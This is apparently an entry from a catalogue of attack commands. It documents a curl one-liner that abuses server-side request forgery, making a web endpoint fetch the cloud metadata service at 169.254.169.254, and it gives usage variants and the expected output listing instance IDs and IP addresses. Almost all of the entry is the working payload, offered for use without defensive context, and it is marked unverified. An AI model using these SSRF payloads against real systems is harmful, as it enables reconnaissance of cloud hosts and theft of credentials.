---
data: >-
  curl -X POST -d 'url=http://169.254.169.254/meta-data'
  https://www.apitest.io/request
tags:
  - ssrf
  - metadata
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:48.439Z'
id: dccb84cc-0523-4ae5-b8c7-071c1f76529a
verified: false
validated: true
submitted: true
---
# curl-ssrf-openstack-metadata

## Command

```bash
curl -X POST -d 'url=http://169.254.169.254/meta-data' https://www.apitest.io/request
```

## Description

Uses SSRF to fetch OpenStack instance metadata, listing keys like instance-id and IPs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `-d 'url=...'` | Metadata URL payload | Yes |
| `https://www.apitest.io/request` | Endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -d 'url=http://169.254.169.254/meta-data' https://www.apitest.io/request
```

### Advanced Usage

```bash
curl -X POST -d 'url=http://169.254.169.254/meta-data/instance-id' https://www.apitest.io/request
```

## Expected Output

Text listing: instance-id
mac
local-ipv4
public-ipv4
network_config
 etc.

## Related

- [[Related Procedure]]
